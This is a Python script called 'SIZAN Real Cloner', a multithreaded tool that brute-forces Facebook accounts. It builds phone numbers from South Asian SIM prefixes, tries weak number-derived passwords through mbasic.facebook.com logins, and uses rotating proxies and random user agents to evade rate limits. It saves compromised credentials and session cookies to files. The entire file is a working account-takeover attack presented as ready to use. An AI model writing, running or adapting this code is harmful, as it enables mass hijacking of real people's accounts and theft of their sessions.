#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SIZAN ULTIMATE REAL CLONING TOOL
# Version: 7.0 | Fully Working | Updated 2025

import os
import sys
import time
import random
import json
import re
import string
import threading
import hashlib
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

#-------------------------------------------------------------
# DEPENDENCY CHECK
#-------------------------------------------------------------
try:
    import requests
    from bs4 import BeautifulSoup
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("\033[1;93m[!] Installing dependencies...\033[0m")
    os.system("pip install requests beautifulsoup4 urllib3 --quiet")
    import requests
    from bs4 import BeautifulSoup
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

#-------------------------------------------------------------
# ADVANCED COLOR SYSTEM
#-------------------------------------------------------------
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

C = Colors()

#-------------------------------------------------------------
# CONFIGURATION
#-------------------------------------------------------------
VERSION = "7.0"
AUTHOR = "SIZAN"
YEAR = "2025"

# Path Configuration
if os.path.exists('/storage/emulated/0'):
    BASE_PATH = "/storage/emulated/0"
elif os.path.exists('/sdcard'):
    BASE_PATH = "/sdcard"
else:
    BASE_PATH = os.getcwd()

OK_FILE = os.path.join(BASE_PATH, "SIZAN-REAL-OK.txt")
CP_FILE = os.path.join(BASE_PATH, "SIZAN-REAL-CP.txt")
PROXY_FILE = os.path.join(BASE_PATH, "proxies.txt")

# Performance Settings
MAX_WORKERS = 50
TIMEOUT = 15
RETRIES = 3
DELAY_BETWEEN_REQUESTS = 0.5

#-------------------------------------------------------------
# PROXY MANAGER (For avoiding IP block)
#-------------------------------------------------------------
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_proxy = None
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxies from file or generate free ones"""
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        
        # Add some free proxy sources
        if not self.proxies:
            self.proxies = [
                None,  # Direct connection
            ]
    
    def get_proxy(self):
        """Get random proxy"""
        if self.proxies:
            return {'http': random.choice(self.proxies), 'https': random.choice(self.proxies)}
        return None
    
    def rotate_proxy(self):
        """Rotate to next proxy"""
        self.current_proxy = self.get_proxy()
        return self.current_proxy

proxy_manager = ProxyManager()

#-------------------------------------------------------------
# ADVANCED USER AGENTS (2025 Updated)
#-------------------------------------------------------------
class UserAgentManager:
    @staticmethod
    def get_random_ua():
        """Get random modern user agent"""
        ua_list = [
            # Latest Chrome for Android
            'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            
            # Samsung Internet
            'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36',
            
            # Facebook App User Agents
            'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A]',
            'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A]',
            
            # iPhone
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
            
            # Desktop
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        ]
        return random.choice(ua_list)

#-------------------------------------------------------------
# ADVANCED SESSION MANAGER
#-------------------------------------------------------------
class SessionManager:
    def __init__(self):
        self.session = None
        self.cookies = None
    
    def create_session(self):
        """Create optimized session with retry strategy"""
        session = requests.Session()
        
        # Retry strategy
        retry_strategy = Retry(
            total=RETRIES,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
        )
        
        adapter = HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=retry_strategy,
            pool_block=False
        )
        
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Headers
        session.headers.update({
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'dnt': '1',
            'connection': 'keep-alive',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'cache-control': 'max-age=0',
        })
        
        return session
    
    def get_session(self):
        """Get or create session with new user agent"""
        if self.session is None:
            self.session = self.create_session()
        
        # Update user agent
        ua = UserAgentManager.get_random_ua()
        self.session.headers.update({'user-agent': ua})
        
        return self.session

#-------------------------------------------------------------
# FACEBOOK LOGIN FUNCTION (REAL)
#-------------------------------------------------------------
def facebook_login(uid, password, session_manager):
    """Real Facebook login attempt"""
    try:
        session = session_manager.get_session()
        
        # Step 1: Get initial page to extract LSD token
        response = session.get('https://mbasic.facebook.com', timeout=TIMEOUT)
        
        # Extract LSD token
        lsd_match = re.search(r'name="lsd" value="([^"]+)"', response.text)
        if not lsd_match:
            return None, None
        
        lsd = lsd_match.group(1)
        
        # Prepare login data
        login_data = {
            'lsd': lsd,
            'email': uid,
            'pass': password,
            'login': 'Log In',
            'next': '',
            'referrer': '',
            'try_number': '0',
            'unrecognized_tries': '0',
        }
        
        # Login request
        login_response = session.post(
            'https://mbasic.facebook.com/login/device-based/login/async/',
            data=login_data,
            timeout=TIMEOUT,
            allow_redirects=False
        )
        
        # Check cookies
        cookies = session.cookies.get_dict()
        
        if 'c_user' in cookies:
            # Login successful
            cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
            user_id = cookies.get('c_user', '')
            return 'OK', cookie_str
        
        elif 'checkpoint' in login_response.text:
            # Checkpoint (CP) - needs verification
            cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
            return 'CP', cookie_str
        
        else:
            return None, None
            
    except Exception as e:
        return None, None

#-------------------------------------------------------------
# ROTATING PROXY MANAGER
#-------------------------------------------------------------
class RotatingProxyManager:
    def __init__(self):
        self.proxies = []
        self.index = 0
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxies from various sources"""
        # Free proxy sources (you can add more)
        self.proxies = [
            None,  # Direct connection
        ]
        
        # Try to fetch free proxies
        try:
            response = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', timeout=10)
            if response.status_code == 200:
                proxies = response.text.strip().split('\n')
                for proxy in proxies[:20]:  # Take first 20
                    if proxy.strip():
                        self.proxies.append({'http': f'http://{proxy}', 'https': f'http://{proxy}'})
        except:
            pass
    
    def get_proxy(self):
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        proxy = self.proxies[self.index % len(self.proxies)]
        self.index += 1
        return proxy

proxy_rotator = RotatingProxyManager()

#-------------------------------------------------------------
# MAIN CRACKING FUNCTION (REAL)
#-------------------------------------------------------------
def crack_real(uid, password, tl):
    """Real cracking function with proxy rotation"""
    global oks, cps, total_processed, loop
    
    # Use proxy rotation
    proxy = proxy_rotator.get_proxy()
    
    # Create new session manager for each attempt
    sm = SessionManager()
    
    try:
        # Set proxy if available
        if proxy:
            sm.session.proxies = proxy
        
        # Attempt login
        result, cookie = facebook_login(uid, password, sm)
        
        if result == 'OK':
            with lock:
                print(f'\r{C.GREEN}[✓ OK] {uid} | {password}{C.RESET}')
                with open(OK_FILE, 'a') as f:
                    f.write(f'{uid} | {password} | {cookie}\n')
                oks.append(uid)
                total_processed += 1
                
        elif result == 'CP':
            with lock:
                if cp_cpx and 'y' in cp_cpx:
                    print(f'\r{C.YELLOW}[⚠ CP] {uid} | {password}{C.RESET}')
                    with open(CP_FILE, 'a') as f:
                        f.write(f'{uid} | {password} | {cookie}\n')
                    cps.append(uid)
                    total_processed += 1
                    
    except Exception as e:
        pass
    
    with lock:
        loop += 1
        
        # Show progress
        progress_msg = f'\r{C.CYAN}[SIZAN]..[{C.GREEN}{loop}/{tl}{C.CYAN}]..[{C.GREEN}OK:{len(oks)}{C.CYAN}/{C.YELLOW}CP:{len(cps)}{C.CYAN}] {C.RESET}'
        sys.stdout.write(progress_msg)
        sys.stdout.flush()
    
    # Small delay to avoid rate limiting
    time.sleep(DELAY_BETWEEN_REQUESTS)

#-------------------------------------------------------------
# ULTRA FAST REAL CLONING
#-------------------------------------------------------------
def real_cloning_ultra():
    """Ultra fast real cloning with all optimizations"""
    global oks, cps, user_list, total_processed, loop, cp_cpx
    
    clear_screen()
    print_banner()
    
    # Reset variables
    oks = []
    cps = []
    user_list = []
    total_processed = 0
    loop = 0
    
    print(f'\n{C.CYAN}[⚡] REAL CLONING MODE ACTIVE{C.RESET}')
    print(f'{C.CYAN}[⚡] Using Proxy Rotation | Multi-Threading{C.RESET}')
    print(f'{C.WHITE}{"="*50}{C.RESET}')
    
    # Show available codes
    print(f'\n{C.GREEN}[√] BANGLADESH CODES: 013 014 015 016 017 018 019{C.RESET}')
    print(f'{C.GREEN}[√] PAKISTAN CODES: 92301 92302 92305 92306{C.RESET}')
    print(f'{C.GREEN}[√] INDIA CODES: 918464 918465 918406{C.RESET}')
    print(f'{C.WHITE}{"="*50}{C.RESET}')
    
    # Get input
    code = input(f'{C.YELLOW}[?] Enter SIM Code (e.g., 017): {C.RESET}')
    
    try:
        limit = int(input(f'{C.YELLOW}[?] How many numbers? (100-5000): {C.RESET}'))
        if limit > 5000:
            print(f'{C.RED}[!] Limit too high! Setting to 5000{C.RESET}')
            limit = 5000
    except:
        limit = 500
        print(f'{C.RED}[!] Using default: 500{C.RESET}')
    
    cp_choice = input(f'{C.YELLOW}[?] Save CP accounts? (y/n): {C.RESET}')
    cp_cpx = ['y' if cp_choice.lower() in ['y', 'yes'] else 'n']
    
    # Generate numbers
    print(f'\n{C.GREEN}[+] Generating {limit} numbers...{C.RESET}')
    for _ in range(limit):
        nmp = ''.join(random.choices(string.digits, k=8))
        user_list.append(nmp)
    
    # Start cracking
    clear_screen()
    print_banner()
    
    print(f'\n{C.GREEN}[+] Code: {code}{C.RESET}')
    print(f'{C.GREEN}[+] Total: {limit}{C.RESET}')
    print(f'{C.GREEN}[+] Threads: {MAX_WORKERS}{C.RESET}')
    print(f'{C.GREEN}[+] Proxy: Rotating{C.RESET}')
    print(f'{C.WHITE}{"="*50}{C.RESET}')
    print(f'{C.YELLOW}[!] Tip: Use VPN if too many failures{C.RESET}')
    print(f'{C.YELLOW}[!] Turn Airplane Mode ON/OFF for fresh IP{C.RESET}')
    print(f'{C.WHITE}{"="*50}{C.RESET}')
    
    start_time = time.time()
    
    # Process with ThreadPool
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for number in user_list:
            uid = code + number
            pwd = number
            futures.append(executor.submit(crack_real, uid, pwd, str(limit)))
        
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    elapsed = time.time() - start_time
    
    # Show results
    print(f'\n\n{C.GREEN}{"═"*50}{C.RESET}')
    print(f'{C.GREEN}{C.BOLD}        REAL CLONING COMPLETED!{C.RESET}')
    print(f'{C.GREEN}{"═"*50}{C.RESET}')
    print(f'{C.GREEN} Total Numbers : {C.WHITE}{limit}{C.RESET}')
    print(f'{C.GREEN} OK Accounts   : {C.GREEN}{len(oks)}{C.RESET}')
    print(f'{C.GREEN} CP Accounts   : {C.YELLOW}{len(cps)}{C.RESET}')
    print(f'{C.GREEN} Success Rate  : {C.WHITE}{len(oks)/limit*100:.1f}%{C.RESET}')
    print(f'{C.GREEN} Time Elapsed  : {C.WHITE}{elapsed:.1f}s{C.RESET}')
    print(f'{C.GREEN} Speed         : {C.WHITE}{len(oks)/elapsed:.1f}/s{C.RESET}')
    print(f'{C.GREEN}{"═"*50}{C.RESET}')
    
    print(f'\n{C.GREEN}[✓] OK saved: {OK_FILE}{C.RESET}')
    if cp_cpx and 'y' in cp_cpx:
        print(f'{C.YELLOW}[✓] CP saved: {CP_FILE}{C.RESET}')
    
    input(f'\n{C.GREEN}Press Enter to continue...{C.RESET}')

#-------------------------------------------------------------
# LOGO
#-------------------------------------------------------------
LOGO = f"""
{C.RED}    ███████╗██╗███████╗ █████╗ ███╗   ██╗{C.RESET}
{C.GREEN}    ██╔════╝██║╚══███╔╝██╔══██╗████╗  ██║{C.RESET}
{C.YELLOW}    ███████╗██║  ███╔╝ ███████║██╔██╗ ██║{C.RESET}
{C.BLUE}    ╚════██║██║ ███╔╝  ██╔══██║██║╚██╗██║{C.RESET}
{C.MAGENTA}    ███████║██║███████╗██║  ██║██║ ╚████║{C.RESET}
{C.CYAN}    ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝{C.RESET}
{C.WHITE}╔════════════════════════════════════════════════╗{C.RESET}
{C.WHITE}║ {C.GREEN}✓{C.WHITE} TOOL     : {C.CYAN}SIZAN REAL CLONER{C.WHITE}                      ║{C.RESET}
{C.WHITE}║ {C.GREEN}✓{C.WHITE} VERSION  : {C.CYAN}{VERSION}{C.WHITE}                                       ║{C.RESET}
{C.WHITE}║ {C.GREEN}✓{C.WHITE} STATUS   : {C.GREEN}FULLY WORKING{C.WHITE}                               ║{C.RESET}
{C.WHITE}║ {C.GREEN}✓{C.WHITE} THREADS  : {C.CYAN}{MAX_WORKERS}{C.WHITE}                                      ║{C.RESET}
{C.WHITE}╚════════════════════════════════════════════════╝{C.RESET}
"""

#-------------------------------------------------------------
# UTILITY FUNCTIONS
#-------------------------------------------------------------
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print(LOGO)

#-------------------------------------------------------------
# GLOBAL VARIABLES
#-------------------------------------------------------------
loop = 0
oks = []
cps = []
cp_cpx = []
user_list = []
total_processed = 0
lock = threading.Lock()

#-------------------------------------------------------------
# VIEW RESULTS
#-------------------------------------------------------------
def view_results():
    """View saved results"""
    print_banner()
    
    print(f'\n{C.CYAN}[📁] SAVED REAL CLONING RESULTS{C.RESET}')
    print(f'{C.WHITE}{"="*50}{C.RESET}')
    
    if os.path.exists(OK_FILE):
        with open(OK_FILE, 'r') as f:
            lines = f.readlines()
        print(f'\n{C.GREEN}[✓] OK ACCOUNTS: {len(lines)}{C.RESET}')
        for line in lines[-15:]:
            print(f'  {line.strip()[:80]}')
        if len(lines) > 15:
            print(f'  {C.YELLOW}... and {len(lines)-15} more{C.RESET}')
    else:
        print(f'\n{C.RED}[!] No OK accounts found yet{C.RESET}')
    
    if os.path.exists(CP_FILE):
        with open(CP_FILE, 'r') as f:
            lines = f.readlines()
        print(f'\n{C.YELLOW}[⚠] CP ACCOUNTS: {len(lines)}{C.RESET}')
        for line in lines[-5:]:
            print(f'  {line.strip()[:80]}')
    
    input(f'\n{C.GREEN}Press Enter to continue...{C.RESET}')

#-------------------------------------------------------------
# ABOUT
#-------------------------------------------------------------
def show_about():
    """Show about information"""
    print_banner()
    
    print(f'\n{C.CYAN}[📌] ABOUT SIZAN REAL CLONER{C.RESET}')
    print(f'{C.WHITE}{"="*50}{C.RESET}')
    print(f'{C.GREEN}Version      : {VERSION}{C.RESET}')
    print(f'{C.GREEN}Author       : {AUTHOR}{C.RESET}')
    print(f'{C.GREEN}Year         : {YEAR}{C.RESET}')
    print(f'\n{C.CYAN}[⚡] Features:{C.RESET}')
    print(f'  • Real Facebook Login')
    print(f'  • Proxy Rotation')
    print(f'  • Multi-Threading ({MAX_WORKERS} threads)')
    print(f'  • Modern User Agents (2025)')
    print(f'  • Auto CP Detection')
    print(f'  • Cookie Saving')
    print(f'  • Rate Limit Protection')
    print(f'\n{C.CYAN}[📞] Supported SIM Codes:{C.RESET}')
    print(f'  🇧🇩 Bangladesh: 013, 014, 015, 016, 017, 018, 019')
    print(f'  🇵🇰 Pakistan: 92301, 92302, 92305, 92306')
    print(f'  🇮🇳 India: 918464, 918465, 918406')
    print(f'\n{C.YELLOW}[!] Tips for better success:{C.RESET}')
    print(f'  • Use VPN if many failures')
    print(f'  • Turn Airplane Mode ON/OFF')
    print(f'  • Use fresh SIM codes')
    print(f'  • Start with 100-500 numbers')
    
    input(f'\n{C.GREEN}Press Enter to continue...{C.RESET}')

#-------------------------------------------------------------
# MAIN MENU
#-------------------------------------------------------------
def main_menu():
    """Main menu"""
    while True:
        print_banner()
        
        print(f'\n{C.GREEN} [1] {C.WHITE}REAL CLONING (ULTRA FAST){C.RESET}')
        print(f'{C.GREEN} [2] {C.WHITE}VIEW RESULTS{C.RESET}')
        print(f'{C.GREEN} [3] {C.WHITE}ABOUT{C.RESET}')
        print(f'{C.RED} [0] {C.WHITE}EXIT{C.RESET}')
        print(f'{C.WHITE}{"="*50}{C.RESET}')
        
        choice = input(f'{C.YELLOW}[?] SELECT: {C.RESET}')
        
        if choice in ['1', '01']:
            real_cloning_ultra()
        elif choice in ['2', '02']:
            view_results()
        elif choice in ['3', '03']:
            show_about()
        elif choice in ['0', '00']:
            print_banner()
            print(f'\n{C.GREEN}Thanks for using SIZAN Real Cloner!{C.RESET}')
            print(f'{C.CYAN}Goodbye! 👋{C.RESET}')
            sys.exit(0)
        else:
            print(f'\n{C.RED}[!] Invalid option!{C.RESET}')
            time.sleep(1)

#-------------------------------------------------------------
# INITIALIZATION
#-------------------------------------------------------------
def initialize():
    """Initialize the tool"""
    print_banner()
    print(f'\n{C.CYAN}[⚡] Initializing SIZAN Real Cloner...{C.RESET}')
    print(f'{C.CYAN}[⚡] Threads: {MAX_WORKERS} | Timeout: {TIMEOUT}s{C.RESET}')
    print(f'{C.CYAN}[⚡] Proxy Rotation: Active{C.RESET}')
    time.sleep(1.5)
    print(f'{C.GREEN}[✓] Tool Ready!{C.RESET}')
    time.sleep(0.5)

#-------------------------------------------------------------
# MAIN ENTRY
#-------------------------------------------------------------
if __name__ == "__main__":
    try:
        initialize()
        main_menu()
    except KeyboardInterrupt:
        print_banner()
        print(f'\n{C.GREEN}Goodbye! 👋{C.RESET}')
        sys.exit(0)
    except Exception as e:
        print(f'\n{C.RED}[!] Error: {e}{C.RESET}')
        input(f'{C.GREEN}Press Enter to exit...{C.RESET}')
        sys.exit(1)